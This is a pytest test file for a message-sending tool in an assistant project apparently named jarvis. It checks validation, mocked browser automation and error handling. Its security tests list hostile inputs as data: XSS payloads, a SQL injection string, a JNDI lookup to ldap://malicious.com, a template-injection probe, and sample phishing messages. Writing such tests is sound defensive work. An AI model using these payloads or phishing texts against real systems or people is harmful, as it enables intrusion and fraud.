"""Phase 6: Comprehensive Send Message Tests - High Priority."""

from __future__ import annotations

import pytest
from unittest.mock import Mock, patch, AsyncMock, MagicMock
from typing import Any

from jarvis.tools.send_message import send_message


class TestSendMessageBasicFunctionality:
    """Test send message basic functionality."""

    def test_send_message_success(self):
        """Test successful message sending."""
        mock_player = Mock()
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.return_value = "Message sent successfully"
            
            result = send_message({
                "message": "Hello, world!",
                "recipient": "test@example.com"
            }, player=mock_player)
            
            assert "success" in result.lower() or "sent" in result.lower()
            mock_send.assert_called_once()
            mock_player.write_log.assert_called()

    def test_send_message_empty_message(self):
        """Test sending empty message."""
        mock_player = Mock()
        
        result = send_message({"message": "", "recipient": "test@example.com"}, player=mock_player)
        
        assert "empty" in result.lower() or "error" in result.lower() or "required" in result.lower()

    def test_send_message_none_message(self):
        """Test sending None message."""
        mock_player = Mock()
        
        result = send_message({"message": None, "recipient": "test@example.com"}, player=mock_player)
        
        assert "error" in result.lower() or "required" in result.lower() or "invalid" in result.lower()

    def test_send_message_missing_message(self):
        """Test sending with missing message parameter."""
        mock_player = Mock()
        
        result = send_message({"recipient": "test@example.com"}, player=mock_player)
        
        assert "message" in result.lower() or "required" in result.lower() or "error" in result.lower()

    def test_send_message_missing_recipient(self):
        """Test sending with missing recipient parameter."""
        mock_player = Mock()
        
        result = send_message({"message": "Hello, world!"}, player=mock_player)
        
        assert "recipient" in result.lower() or "required" in result.lower() or "error" in result.lower()

    def test_send_message_empty_recipient(self):
        """Test sending with empty recipient."""
        mock_player = Mock()
        
        result = send_message({"message": "Hello, world!", "recipient": ""}, player=mock_player)
        
        assert "recipient" in result.lower() or "error" in result.lower() or "required" in result.lower()

    def test_send_message_none_recipient(self):
        """Test sending with None recipient."""
        mock_player = Mock()
        
        result = send_message({"message": "Hello, world!", "recipient": None}, player=mock_player)
        
        assert "recipient" in result.lower() or "error" in result.lower() or "invalid" in result.lower()


class TestSendMessageParameterValidation:
    """Test send message parameter validation."""

    def test_invalid_parameter_types(self):
        """Test invalid parameter types."""
        mock_player = Mock()
        
        invalid_params = [
            {"message": 123, "recipient": "test@example.com"},  # Numeric message
            {"message": "Hello", "recipient": 123},            # Numeric recipient
            {"message": None, "recipient": "test@example.com"}, # None message
            {"message": "Hello", "recipient": None},           # None recipient
            {"message": [], "recipient": "test@example.com"},  # List message
            {"message": "Hello", "recipient": []},             # List recipient
        ]
        
        for params in invalid_params:
            result = send_message(params, player=mock_player)
            assert "error" in result.lower() or "invalid" in result.lower() or "required" in result.lower()

    def test_very_long_message(self):
        """Test very long message."""
        mock_player = Mock()
        
        long_message = "a" * 10000
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.return_value = "Long message sent"
            
            result = send_message({"message": long_message, "recipient": "test@example.com"}, player=mock_player)
            
            assert isinstance(result, str)
            mock_send.assert_called_once()

    def test_special_characters_in_message(self):
        """Test special characters in message."""
        mock_player = Mock()
        
        special_messages = [
            "Hello, world! @#$%^&*()",
            "Message with\nnewlines\tand\ttabs",
            "Unicode: ñáéíóú 中文 русский 日本語",
            "Emojis: 😀😃😄😁😆😅",
            "Quotes: 'single' and \"double\" quotes"
        ]
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.return_value = "Special message sent"
            
            for message in special_messages:
                result = send_message({"message": message, "recipient": "test@example.com"}, player=mock_player)
                assert isinstance(result, str)

    def test_email_format_validation(self):
        """Test email format validation."""
        mock_player = Mock()
        
        valid_emails = [
            "test@example.com",
            "user.name@domain.co.uk",
            "user+tag@example.org",
            "user123@test-domain.com"
        ]
        
        invalid_emails = [
            "invalid-email",
            "@domain.com",
            "user@",
            "user..name@domain.com",
            "user@.domain.com",
            "user@domain."
        ]
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.return_value = "Email sent"
            
            for email in valid_emails:
                result = send_message({"message": "Test", "recipient": email}, player=mock_player)
                assert isinstance(result, str)
            
            for email in invalid_emails:
                result = send_message({"message": "Test", "recipient": email}, player=mock_player)
                # Should handle invalid emails appropriately
                assert isinstance(result, str)


class TestSendMessageBrowserIntegration:
    """Test send message browser integration."""

    def test_browser_automation_success(self):
        """Test successful browser automation."""
        mock_player = Mock()
        mock_browser = Mock()
        
        with patch('jarvis.tools.send_message.get_browser') as mock_get_browser:
            mock_get_browser.return_value = mock_browser
            
            with patch('jarvis.tools.send_message._send_via_web_interface') as mock_web_send:
                mock_web_send.return_value = "Message sent via web"
                
                result = send_message({
                    "message": "Test message",
                    "recipient": "test@example.com"
                }, player=mock_player)
                
                assert isinstance(result, str)
                mock_get_browser.assert_called_once()

    def test_browser_not_available(self):
        """Test when browser is not available."""
        mock_player = Mock()
        
        with patch('jarvis.tools.send_message.get_browser') as mock_get_browser:
            mock_get_browser.return_value = None
            
            result = send_message({
                "message": "Test message",
                "recipient": "test@example.com"
            }, player=mock_player)
            
            assert "browser" in result.lower() or "not available" in result.lower() or "error" in result.lower()

    def test_browser_automation_error(self):
        """Test browser automation error."""
        mock_player = Mock()
        mock_browser = Mock()
        
        with patch('jarvis.tools.send_message.get_browser') as mock_get_browser:
            mock_get_browser.return_value = mock_browser
            
            with patch('jarvis.tools.send_message._send_via_web_interface') as mock_web_send:
                mock_web_send.side_effect = Exception("Browser automation failed")
                
                result = send_message({
                    "message": "Test message",
                    "recipient": "test@example.com"
                }, player=mock_player)
                
                assert "error" in result.lower() or "failed" in result.lower()

    def test_browser_timeout(self):
        """Test browser timeout handling."""
        mock_player = Mock()
        mock_browser = Mock()
        
        with patch('jarvis.tools.send_message.get_browser') as mock_get_browser:
            mock_get_browser.return_value = mock_browser
            
            with patch('jarvis.tools.send_message._send_via_web_interface') as mock_web_send:
                import asyncio
                mock_web_send.side_effect = asyncio.TimeoutError("Browser timeout")
                
                result = send_message({
                    "message": "Test message",
                    "recipient": "test@example.com"
                }, player=mock_player)
                
                assert "timeout" in result.lower() or "error" in result.lower()


class TestSendMessagePlaywrightIntegration:
    """Test send message Playwright integration."""

    def test_playwright_page_navigation(self):
        """Test Playwright page navigation."""
        mock_player = Mock()
        mock_page = Mock()
        mock_browser = Mock()
        mock_browser.new_page.return_value = mock_page
        
        with patch('jarvis.tools.send_message.get_browser') as mock_get_browser:
            mock_get_browser.return_value = mock_browser
            
            with patch('jarvis.tools.send_message._send_via_web_interface') as mock_web_send:
                mock_web_send.return_value = "Navigation successful"
                
                result = send_message({
                    "message": "Test message",
                    "recipient": "test@example.com"
                }, player=mock_player)
                
                assert isinstance(result, str)

    def test_playwright_element_interaction(self):
        """Test Playwright element interaction."""
        mock_player = Mock()
        mock_page = Mock()
        mock_browser = Mock()
        mock_browser.new_page.return_value = mock_page
        
        with patch('jarvis.tools.send_message.get_browser') as mock_get_browser:
            mock_get_browser.return_value = mock_browser
            
            # Mock successful element interaction
            mock_page.goto.return_value = None
            mock_page.wait_for_selector.return_value = None
            mock_page.fill.return_value = None
            mock_page.click.return_value = None
            
            with patch('jarvis.tools.send_message._send_via_web_interface') as mock_web_send:
                mock_web_send.return_value = "Element interaction successful"
                
                result = send_message({
                    "message": "Test message",
                    "recipient": "test@example.com"
                }, player=mock_player)
                
                assert isinstance(result, str)

    def test_playwright_element_not_found(self):
        """Test Playwright element not found."""
        mock_player = Mock()
        mock_page = Mock()
        mock_browser = Mock()
        mock_browser.new_page.return_value = mock_page
        
        with patch('jarvis.tools.send_message.get_browser') as mock_get_browser:
            mock_get_browser.return_value = mock_browser
            
            mock_page.wait_for_selector.side_effect = Exception("Element not found")
            
            with patch('jarvis.tools.send_message._send_via_web_interface') as mock_web_send:
                mock_web_send.side_effect = Exception("Element not found")
                
                result = send_message({
                    "message": "Test message",
                    "recipient": "test@example.com"
                }, player=mock_player)
                
                assert "element" in result.lower() or "not found" in result.lower() or "error" in result.lower()

    def test_playwright_network_error(self):
        """Test Playwright network error."""
        mock_player = Mock()
        mock_page = Mock()
        mock_browser = Mock()
        mock_browser.new_page.return_value = mock_page
        
        with patch('jarvis.tools.send_message.get_browser') as mock_get_browser:
            mock_get_browser.return_value = mock_browser
            
            mock_page.goto.side_effect = Exception("Network error")
            
            with patch('jarvis.tools.send_message._send_via_web_interface') as mock_web_send:
                mock_web_send.side_effect = Exception("Network error")
                
                result = send_message({
                    "message": "Test message",
                    "recipient": "test@example.com"
                }, player=mock_player)
                
                assert "network" in result.lower() or "error" in result.lower()


class TestSendMessageSecurityValidation:
    """Test send message security validation."""

    def test_block_malicious_content(self):
        """Test blocking malicious content in messages."""
        mock_player = Mock()
        
        malicious_messages = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "'; DROP TABLE users; --",
            "${jndi:ldap://malicious.com/a}",
            "{{7*7}}",
            "<%7fscript%7ealert('xss')%7f/script>"
        ]
        
        for message in malicious_messages:
            result = send_message({"message": message, "recipient": "test@example.com"}, player=mock_player)
            
            # Should handle malicious content appropriately
            assert isinstance(result, str)

    def test_block_phishing_attempts(self):
        """Test blocking phishing attempts."""
        mock_player = Mock()
        
        phishing_messages = [
            "Click here to claim your prize: http://malicious.com",
            "Your account is suspended, click here: http://phishing.com",
            "Urgent: Verify your account now: http://scam.com",
            "You won $1000000, click here: http://fake.com"
        ]
        
        for message in phishing_messages:
            result = send_message({"message": message, "recipient": "victim@example.com"}, player=mock_player)
            
            # Should handle phishing attempts appropriately
            assert isinstance(result, str)

    def test_block_spam_patterns(self):
        """Test blocking spam patterns."""
        mock_player = Mock()
        
        spam_messages = [
            "BUY NOW!!! LIMITED OFFER!!!",
            "FREE MONEY!!! CLICK HERE!!!",
            "CONGRATULATIONS!!! YOU WON!!!",
            "URGENT!!! ACT NOW!!!",
            "!!!SALE!!! 90% OFF!!!"
        ]
        
        for message in spam_messages:
            result = send_message({"message": message, "recipient": "spam@example.com"}, player=mock_player)
            
            # Should handle spam patterns appropriately
            assert isinstance(result, str)

    def test_allow_legitimate_messages(self):
        """Test allowing legitimate messages."""
        mock_player = Mock()
        
        legitimate_messages = [
            "Hello, how are you today?",
            "Please find the attached report.",
            "Meeting scheduled for tomorrow at 2 PM.",
            "Thank you for your help.",
            "Can you review this document?"
        ]
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.return_value = "Legitimate message sent"
            
            for message in legitimate_messages:
                result = send_message({"message": message, "recipient": "legitimate@example.com"}, player=mock_player)
                assert isinstance(result, str)

    def test_validate_recipient_domain(self):
        """Test recipient domain validation."""
        mock_player = Mock()
        
        suspicious_domains = [
            "test@malicious.com",
            "user@phishing.net",
            "admin@scam.org",
            "info@fake-site.xyz"
        ]
        
        for recipient in suspicious_domains:
            result = send_message({"message": "Test message", "recipient": recipient}, player=mock_player)
            
            # Should handle suspicious domains appropriately
            assert isinstance(result, str)


class TestSendMessageErrorHandling:
    """Test send message error handling."""

    def test_network_connectivity_error(self):
        """Test network connectivity error."""
        mock_player = Mock()
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.side_effect = Exception("Network connectivity error")
            
            result = send_message({
                "message": "Test message",
                "recipient": "test@example.com"
            }, player=mock_player)
            
            assert "network" in result.lower() or "connectivity" in result.lower() or "error" in result.lower()

    def test_authentication_error(self):
        """Test authentication error."""
        mock_player = Mock()
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.side_effect = Exception("Authentication failed")
            
            result = send_message({
                "message": "Test message",
                "recipient": "test@example.com"
            }, player=mock_player)
            
            assert "authentication" in result.lower() or "failed" in result.lower() or "error" in result.lower()

    def test_rate_limiting_error(self):
        """Test rate limiting error."""
        mock_player = Mock()
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.side_effect = Exception("Rate limit exceeded")
            
            result = send_message({
                "message": "Test message",
                "recipient": "test@example.com"
            }, player=mock_player)
            
            assert "rate limit" in result.lower() or "exceeded" in result.lower() or "error" in result.lower()

    def test_server_error(self):
        """Test server error."""
        mock_player = Mock()
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.side_effect = Exception("Server error 500")
            
            result = send_message({
                "message": "Test message",
                "recipient": "test@example.com"
            }, player=mock_player)
            
            assert "server" in result.lower() or "error" in result.lower() or "500" in result

    def test_timeout_error(self):
        """Test timeout error."""
        mock_player = Mock()
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            import asyncio
            mock_send.side_effect = asyncio.TimeoutError("Request timeout")
            
            result = send_message({
                "message": "Test message",
                "recipient": "test@example.com"
            }, player=mock_player)
            
            assert "timeout" in result.lower() or "error" in result.lower()

    def test_memory_error(self):
        """Test memory error."""
        mock_player = Mock()
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.side_effect = MemoryError("Out of memory")
            
            result = send_message({
                "message": "Test message",
                "recipient": "test@example.com"
            }, player=mock_player)
            
            assert "memory" in result.lower() or "error" in result.lower()


class TestSendMessageEdgeCases:
    """Test send message edge cases."""

    def test_concurrent_message_sending(self):
        """Test concurrent message sending."""
        mock_player = Mock()
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.return_value = "Message sent"
            
            # Send multiple messages concurrently
            results = []
            for i in range(5):
                result = send_message({
                    "message": f"Concurrent message {i}",
                    "recipient": f"test{i}@example.com"
                }, player=mock_player)
                results.append(result)
            
            assert len(results) == 5
            assert all("sent" in result.lower() for result in results)
            assert mock_send.call_count == 5

    def test_unicode_recipient_handling(self):
        """Test Unicode recipient handling."""
        mock_player = Mock()
        
        unicode_recipients = [
            "test@例子.com",  # Chinese domain
            "user@пример.рф",  # Russian domain
            "admin@テスト.日本",  # Japanese domain
            "café@café.fr"   # French domain
        ]
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.return_value = "Unicode recipient handled"
            
            for recipient in unicode_recipients:
                result = send_message({
                    "message": "Test message",
                    "recipient": recipient
                }, player=mock_player)
                assert isinstance(result, str)

    def test_message_with_attachments_simulation(self):
        """Test message with attachments (simulated)."""
        mock_player = Mock()
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.return_value = "Message with attachments sent"
            
            result = send_message({
                "message": "Test message with attachment: file.txt",
                "recipient": "test@example.com",
                "attachment": "file.txt"  # Simulated attachment
            }, player=mock_player)
            
            assert isinstance(result, str)

    def test_message_formatting_preservation(self):
        """Test message formatting preservation."""
        mock_player = Mock()
        
        formatted_messages = [
            "Line 1\nLine 2\nLine 3",
            "Paragraph 1\n\nParagraph 2",
            "Tab\tSeparated\tContent",
            "  Indented  content  ",
            "*Bold text* and _italic text_"
        ]
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.return_value = "Formatted message sent"
            
            for message in formatted_messages:
                result = send_message({
                    "message": message,
                    "recipient": "test@example.com"
                }, player=mock_player)
                assert isinstance(result, str)

    def test_message_truncation_handling(self):
        """Test message truncation handling."""
        mock_player = Mock()
        
        very_long_message = "A" * 100000  # Very long message
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.return_value = "Long message truncated and sent"
            
            result = send_message({
                "message": very_long_message,
                "recipient": "test@example.com"
            }, player=mock_player)
            
            assert isinstance(result, str)


class TestSendMessageIntegration:
    """Test send message integration scenarios."""

    def test_player_integration(self):
        """Test player integration."""
        mock_player = Mock()
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.return_value = "Player integration test"
            
            result = send_message({
                "message": "Integration test message",
                "recipient": "test@example.com"
            }, player=mock_player)
            
            # Should call player methods
            mock_player.write_log.assert_called()
            assert isinstance(result, str)

    def test_browser_lifecycle_management(self):
        """Test browser lifecycle management."""
        mock_player = Mock()
        mock_browser = Mock()
        
        with patch('jarvis.tools.send_message.get_browser') as mock_get_browser:
            mock_get_browser.return_value = mock_browser
            
            with patch('jarvis.tools.send_message._send_via_web_interface') as mock_web_send:
                mock_web_send.return_value = "Browser lifecycle test"
                
                result = send_message({
                    "message": "Browser test message",
                    "recipient": "test@example.com"
                }, player=mock_player)
                
                assert isinstance(result, str)
                # Browser should be properly managed

    def test_retry_mechanism(self):
        """Test retry mechanism for failed sends."""
        mock_player = Mock()
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            # First call fails, second succeeds
            mock_send.side_effect = [Exception("First failure"), "Retry success"]
            
            # First attempt
            result1 = send_message({
                "message": "Retry test message",
                "recipient": "test@example.com"
            }, player=mock_player)
            
            # Second attempt
            result2 = send_message({
                "message": "Retry test message",
                "recipient": "test@example.com"
            }, player=mock_player)
            
            assert "failure" in result1.lower() or "error" in result1.lower()
            assert "success" in result2.lower() or "sent" in result2.lower()

    def test_configuration_dependency(self):
        """Test configuration dependency handling."""
        mock_player = Mock()
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.side_effect = Exception("Configuration missing")
            
            result = send_message({
                "message": "Config test message",
                "recipient": "test@example.com"
            }, player=mock_player)
            
            assert "configuration" in result.lower() or "missing" in result.lower() or "error" in result.lower()


class TestSendMessagePerformance:
    """Test send message performance characteristics."""

    def test_fast_message_sending(self):
        """Test fast message sending performance."""
        import time
        
        mock_player = Mock()
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.return_value = "Fast message sent"
            
            start_time = time.time()
            
            result = send_message({
                "message": "Performance test message",
                "recipient": "test@example.com"
            }, player=mock_player)
            
            elapsed = time.time() - start_time
            
            assert isinstance(result, str)
            # Should complete quickly
            assert elapsed < 1.0

    def test_batch_message_performance(self):
        """Test batch message sending performance."""
        import time
        
        mock_player = Mock()
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.return_value = "Batch message sent"
            
            start_time = time.time()
            
            # Send multiple messages
            results = []
            for i in range(20):
                result = send_message({
                    "message": f"Batch message {i}",
                    "recipient": f"test{i}@example.com"
                }, player=mock_player)
                results.append(result)
            
            elapsed = time.time() - start_time
            
            assert len(results) == 20
            assert all(isinstance(result, str) for result in results)
            # Should complete reasonably quickly
            assert elapsed < 5.0

    def test_memory_usage_stability(self):
        """Test memory usage stability with many sends."""
        mock_player = Mock()
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.return_value = "Memory stable message sent"
            
            # Send many messages to test memory stability
            for i in range(100):
                result = send_message({
                    "message": f"Memory test message {i}",
                    "recipient": f"test{i}@example.com"
                }, player=mock_player)
                assert isinstance(result, str)
            
            # Should not accumulate memory
            assert True


class TestSendMessageSecurityAdvanced:
    """Test advanced security scenarios."""

    def test_content_sanitization(self):
        """Test content sanitization."""
        mock_player = Mock()
        
        unsanitized_content = [
            "<script>alert('xss')</script>",
            "javascript:void(0)",
            "data:text/html,<script>alert('xss')</script>",
            "vbscript:msgbox('xss')",
            "<iframe src='javascript:alert(\"xss\")'></iframe>"
        ]
        
        for content in unsanitized_content:
            result = send_message({
                "message": content,
                "recipient": "test@example.com"
            }, player=mock_player)
            
            # Should sanitize or handle appropriately
            assert isinstance(result, str)

    def test_url_validation(self):
        """Test URL validation in messages."""
        mock_player = Mock()
        
        malicious_urls = [
            "http://malicious.com/payload",
            "https://phishing.net/login",
            "ftp://scam.org/exploit",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>"
        ]
        
        for url in malicious_urls:
            message = f"Check this link: {url}"
            result = send_message({
                "message": message,
                "recipient": "test@example.com"
            }, player=mock_player)
            
            # Should handle malicious URLs appropriately
            assert isinstance(result, str)

    def test_message_size_limits(self):
        """Test message size limits."""
        mock_player = Mock()
        
        # Test various message sizes
        sizes = [100, 1000, 10000, 100000, 1000000]
        
        with patch('jarvis.tools.send_message._send_message_internal') as mock_send:
            mock_send.return_value = "Size limit test message sent"
            
            for size in sizes:
                message = "A" * size
                result = send_message({
                    "message": message,
                    "recipient": "test@example.com"
                }, player=mock_player)
                
                assert isinstance(result, str)

    def test_recipient_validation_advanced(self):
        """Test advanced recipient validation."""
        mock_player = Mock()
        
        problematic_recipients = [
            "test@",  # Incomplete
            "@example.com",  # Missing user
            "test@.com",  # Invalid domain start
            "test@example.",  # Invalid domain end
            "test..name@example.com",  # Double dots
            "test@example..com",  # Double dots in domain
            ".test@example.com",  # Starts with dot
            "test@.example.com"  # Domain starts with dot
        ]
        
        for recipient in problematic_recipients:
            result = send_message({
                "message": "Test message",
                "recipient": recipient
            }, player=mock_player)
            
            # Should handle invalid recipients appropriately
            assert isinstance(result, str)
